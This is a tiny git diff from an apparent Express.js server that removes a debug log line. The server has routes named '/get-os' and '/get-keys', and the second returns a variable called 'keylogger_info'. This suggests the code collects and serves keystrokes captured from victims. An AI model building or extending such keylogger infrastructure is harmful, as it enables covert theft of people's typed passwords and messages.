@@ -84,7 +84,6 @@ app.get('/get-os', (req, res) => {
 });
 
 app.get('/get-keys', (req, res) => {
-    console.log(keylogger_info)
     res.json(keylogger_info);
 });
 
